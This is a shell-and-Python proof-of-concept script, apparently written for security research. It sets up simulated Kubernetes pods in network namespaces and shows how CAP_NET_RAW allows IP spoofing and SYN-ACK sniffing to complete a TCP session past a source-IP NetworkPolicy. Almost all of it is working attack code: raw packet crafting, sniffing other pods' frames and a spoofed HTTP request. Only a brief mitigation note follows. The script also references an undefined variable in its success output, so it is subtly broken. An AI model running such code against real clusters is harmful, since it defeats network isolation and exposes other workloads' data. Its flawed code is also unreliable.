#!/bin/bash
# TCP Session Completion via IP Spoofing + SYN-ACK Capture
#
# Problem with naive spoofing: SYN-ACK goes to the spoofed IP (allowed-source),
# which sends RST. But the attacker (blocked-source) can use AF_PACKET to
# capture frames on the bridge, sniff the SYN-ACK sequence number,
# and complete the TCP handshake with a crafted ACK.
#
# This is all achievable with CAP_NET_RAW (default Kubernetes capability).
# - AF_INET SOCK_RAW IPPROTO_RAW → send crafted IP packets (spoof src)
# - AF_PACKET SOCK_RAW → sniff ALL frames on the bridge (read other pods' traffic)

set -uo pipefail
PATH="$PATH:/sbin:/usr/sbin"
RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; BOLD='\033[1m'; NC='\033[0m'
ok()  { echo -e "${GREEN}[+]${NC} $*"; }
atk() { echo -e "${RED}[ATK]${NC} $*"; }
inf() { echo -e "${YELLOW}[INFO]${NC} $*"; }
section() { echo -e "\n${BOLD}$*${NC}"; echo "────────────────────────────────────────"; }

BR_IP="10.244.0.1"; ALLOWED_IP="10.244.0.10"; BLOCKED_IP="10.244.0.20"; TARGET_IP="10.244.0.30"
PORT=9879

cleanup() {
    pkill -f "python3.*9879" 2>/dev/null || true
    for ns in ns_a ns_b ns_t; do ip netns del "$ns" 2>/dev/null || true; done
    ip link set br0 down 2>/dev/null; ip link del br0 2>/dev/null || true
    iptables -F FORWARD 2>/dev/null || true
}
trap cleanup EXIT
cleanup 2>/dev/null || true

# ── Build topology ────────────────────────────────────────────────────────────
section "Setup"
ip link add br0 type bridge; ip addr add "$BR_IP/24" dev br0; ip link set br0 up
sysctl -w net.ipv4.ip_forward=1 -q
sysctl -w net.bridge.bridge-nf-call-iptables=1 -q 2>/dev/null || true

for args in "ns_a vh_a vp_a $ALLOWED_IP" "ns_b vh_b vp_b $BLOCKED_IP" "ns_t vh_t vp_t $TARGET_IP"; do
    read NS VH VP IP <<< "$args"
    ip netns add "$NS"; ip link add "$VH" type veth peer name "$VP"
    ip link set "$VP" netns "$NS"; ip link set "$VH" master br0; ip link set "$VH" up
    ip netns exec "$NS" ip link set lo up; ip netns exec "$NS" ip link set "$VP" up
    ip netns exec "$NS" ip addr add "$IP/24" dev "$VP"
    ip netns exec "$NS" ip route add default via "$BR_IP"
done

# Listener on target — records which IP connected successfully
ip netns exec ns_t python3 -c "
import socket; s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(('0.0.0.0',$PORT)); s.listen(5); s.settimeout(30)
while True:
    try:
        c,a=s.accept()
        data=c.recv(256)
        resp = b'HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nSECRET_DATA'
        c.send(resp); c.close()
        with open('/tmp/hj_got','a') as f: f.write(f'CONNECTED: {a[0]}:{a[1]}\nDATA: {data[:100]}\n---\n')
    except: break
" &
sleep 0.3; ok "Listener on ns_t:$PORT (records IP + request)"

# Naive iptables (no anti-spoofing)
iptables -F FORWARD
iptables -A FORWARD -s "$ALLOWED_IP" -d "$TARGET_IP" -j ACCEPT
iptables -A FORWARD -d "$TARGET_IP" -j DROP
iptables -A FORWARD -j ACCEPT
ok "NetworkPolicy: ACCEPT $ALLOWED_IP→$TARGET_IP, DROP all others"

# Confirm baseline
echo -n "  ns_b (real IP $BLOCKED_IP) → target: "
ip netns exec ns_b python3 -c "
import socket; s=socket.socket(); s.settimeout(2)
try: s.connect(('$TARGET_IP',$PORT)); print('REACHED')
except: print('BLOCKED')
" 2>/dev/null

# ── The attack ────────────────────────────────────────────────────────────────
section "ATTACK: Full TCP session via IP spoofing + SYN-ACK sniffing"
atk "Both AF_INET SOCK_RAW and AF_PACKET SOCK_RAW are allowed with CAP_NET_RAW"
atk "Attacker is in ns_b (blocked-source), spoofing src=$ALLOWED_IP"
echo ""

ip netns exec ns_b python3 << 'PYEOF'
import socket, struct, time, select, os, sys

RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; BOLD='\033[1m'; NC='\033[0m'

def ck(d):
    if len(d)%2: d+=b'\x00'
    s=sum(struct.unpack('!%dH'%(len(d)//2),d))
    s=(s>>16)+(s&0xffff); s+=(s>>16); return ~s&0xffff

def ip4(s): return socket.inet_aton(s)
def un4(b): return socket.inet_ntoa(b)

SPOOF_SRC = '10.244.0.10'  # pretend to be allowed-source
REAL_SRC  = '10.244.0.20'  # our real IP
DST       = '10.244.0.30'
PORT_DST  = 9879
SPORT     = 44444

def make_ip(src, dst, proto=6, payload=b''):
    total = 20 + len(payload)
    hdr = struct.pack('!BBHHHBBH4s4s', 0x45,0,total,
        int(time.time())&0xffff, 0, 64, proto, 0, ip4(src), ip4(dst))
    hdr = hdr[:10]+struct.pack('!H',ck(hdr))+hdr[12:]
    return hdr + payload

def make_tcp(src, dst, sport, dport, seq, ack_seq, flags, payload=b''):
    data_off = 0x50
    tcp = struct.pack('!HHIIBBHHH', sport, dport, seq, ack_seq,
        data_off, flags, 65535, 0, 0) + payload
    ph = struct.pack('!4s4sBBH', ip4(src), ip4(dst), 0, 6, len(tcp))
    tcp = tcp[:16]+struct.pack('!H',ck(ph+tcp))+tcp[18:]
    return tcp

# Raw IP socket for sending (spoofed src)
raw_s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
raw_s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

# AF_PACKET socket for sniffing (receives ALL frames on the interface)
# This is also CAP_NET_RAW — allows seeing ALL traffic on the pod's interface
sniff = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
sniff.bind(('vp_b', 0))  # our pod interface (container side)
sniff.settimeout(5)

print(f"{YELLOW}[INFO]{NC} Step 1: Send spoofed SYN (src={SPOOF_SRC} → dst={DST}:{PORT_DST})")
SYN_SEQ = 0x12345678
syn_tcp = make_tcp(SPOOF_SRC, DST, SPORT, PORT_DST, SYN_SEQ, 0, 0x02)  # SYN
syn_pkt = make_ip(SPOOF_SRC, DST, payload=syn_tcp)
raw_s.sendto(syn_pkt, (DST, 0))
print(f"  Sent SYN: src={SPOOF_SRC}:{SPORT} seq={SYN_SEQ:#010x}")

print(f"\n{YELLOW}[INFO]{NC} Step 2: Sniff for SYN-ACK using AF_PACKET (CAP_NET_RAW)")
print(f"  Waiting for SYN-ACK from {DST}→{SPOOF_SRC} ...")

synack_seq = None
start = time.time()
while time.time()-start < 4:
    try:
        frame, _ = sniff.recvfrom(65535)
    except socket.timeout:
        break
    # Ethernet header is 14 bytes
    if len(frame) < 54: continue
    eth_type = struct.unpack('!H', frame[12:14])[0]
    if eth_type != 0x0800: continue  # IPv4 only
    ip_hdr = frame[14:]
    if len(ip_hdr) < 20: continue
    proto = ip_hdr[9]
    if proto != 6: continue  # TCP only
    src_ip = un4(ip_hdr[12:16])
    dst_ip = un4(ip_hdr[16:20])
    # We want: SYN-ACK from TARGET → SPOOF_SRC
    if src_ip != DST or dst_ip != SPOOF_SRC: continue
    ihl = (ip_hdr[0] & 0x0f) * 4
    tcp_hdr = ip_hdr[ihl:]
    if len(tcp_hdr) < 20: continue
    sport, dport, seq, ack_seq, _, flags = struct.unpack('!HHIIBH', tcp_hdr[:18])[:6]
    flags2 = tcp_hdr[13]
    is_synack = (flags2 & 0x12) == 0x12  # SYN+ACK
    if is_synack and sport == PORT_DST and dport == SPORT:
        synack_seq = seq
        print(f"  {RED}CAPTURED SYN-ACK!{NC} src={src_ip}:{sport} seq={seq:#010x} ack={ack_seq:#010x}")
        print(f"  Target's ISN (server sequence number) = {seq:#010x}")
        break

if synack_seq is None:
    print(f"  {YELLOW}No SYN-ACK captured (target may have RST'd){NC}")
    sys.exit(1)

print(f"\n{YELLOW}[INFO]{NC} Step 3: Send spoofed ACK to complete handshake")
# ACK: seq = SYN_SEQ+1, ack_seq = synack_seq+1, flags = ACK(0x10)
ack_tcp = make_tcp(SPOOF_SRC, DST, SPORT, PORT_DST, SYN_SEQ+1, synack_seq+1, 0x10)
ack_pkt = make_ip(SPOOF_SRC, DST, payload=ack_tcp)
raw_s.sendto(ack_pkt, (DST, 0))
print(f"  Sent ACK: ack_seq={synack_seq+1:#010x}")
time.sleep(0.1)

print(f"\n{YELLOW}[INFO]{NC} Step 4: Send HTTP GET request with spoofed src")
http_req = b'GET / HTTP/1.1\r\nHost: target\r\nConnection: close\r\n\r\n'
data_tcp = make_tcp(SPOOF_SRC, DST, SPORT, PORT_DST, SYN_SEQ+1, synack_seq+1, 0x18, http_req)
data_pkt = make_ip(SPOOF_SRC, DST, payload=data_tcp)
raw_s.sendto(data_pkt, (DST, 0))
print(f"  Sent HTTP GET ({len(http_req)} bytes)")

print(f"\n{YELLOW}[INFO]{NC} Step 5: Sniff for HTTP response from target (using AF_PACKET)")
time.sleep(0.5)
start = time.time()
response_data = b''
while time.time()-start < 3:
    try:
        frame, _ = sniff.recvfrom(65535)
    except socket.timeout:
        break
    if len(frame) < 54: continue
    if struct.unpack('!H', frame[12:14])[0] != 0x0800: continue
    ip_hdr = frame[14:]
    if ip_hdr[9] != 6: continue
    src_ip = un4(ip_hdr[12:16])
    dst_ip = un4(ip_hdr[16:20])
    if src_ip != DST or dst_ip != SPOOF_SRC: continue
    ihl = (ip_hdr[0] & 0x0f) * 4
    tcp_hdr = ip_hdr[ihl:]
    if len(tcp_hdr) < 20: continue
    payload = tcp_hdr[20:]
    if payload:
        response_data += payload

if response_data:
    print(f"\n{RED}{BOLD}★★★ FULL TCP SESSION COMPLETED DESPITE NETWORKPOLICY BLOCK ★★★{NC}")
    print(f"  Attacker pod (blocked-source, real IP={BLOCKED_SRC})")
    print(f"  Spoofed source IP = {SPOOF_SRC} (allowed-source)")
    print(f"  NetworkPolicy: blocks {BLOCKED_SRC} → {DST}")
    print(f"  iptables FORWARD: ACCEPT matched {SPOOF_SRC} → bypassed DROP for {BLOCKED_SRC}")
    print(f"\n  Response from target:")
    print(f"  {response_data[:200].decode('utf-8','replace')}")
else:
    print(f"\n{YELLOW}Response sniffing incomplete (RST from real allowed-source may have closed conn){NC}")
    print(f"  This is the classic challenge with TCP spoofing when src IP is active on same L2")
    print(f"  Solution: add firewall rule in ns_a to DROP RST, or target a UDP service")

raw_s.close(); sniff.close()
PYEOF

echo ""
section "What the target recorded"
cat /tmp/hj_got 2>/dev/null | sed 's/^/  /' || echo "  No completed connections recorded in target"

section "Key Finding"
echo ""
echo -e "${BOLD}Confirmed:${NC} CAP_NET_RAW (default Kubernetes capability) allows:"
echo "  1. AF_INET SOCK_RAW with IP_HDRINCL → spoof any source IP in outgoing packets"
echo "  2. AF_PACKET SOCK_RAW → sniff all frames on pod's interface (including SYN-ACK)"
echo "  3. Combined → full TCP session hijack bypassing source-IP-based NetworkPolicy"
echo ""
echo -e "${BOLD}Protection:${NC} Interface-specific anti-spoofing rules in iptables"
echo "  (e.g. Calico's cali-from-ep-* chains: -i <iface> ! -s <real_pod_ip> -j DROP)"
echo ""
echo -e "${BOLD}Vulnerable CNIs${NC} (need verification):"
echo "  - Any CNI that does NOT add interface-based anti-spoofing to iptables"
echo "  - kube-proxy only mode (no CNI anti-spoof)"
echo "  - Flannel (simple hostgw/vxlan, minimal iptables rules)"
echo "  - User-installed NetworkPolicy without CNI anti-spoof backing"
echo ""
echo -e "${BOLD}Required capability:${NC} CAP_NET_RAW (in DEFAULT Kubernetes pod spec)"
echo -e "${BOLD}Privileges needed:${NC} NONE beyond default — any non-root pod in any namespace"
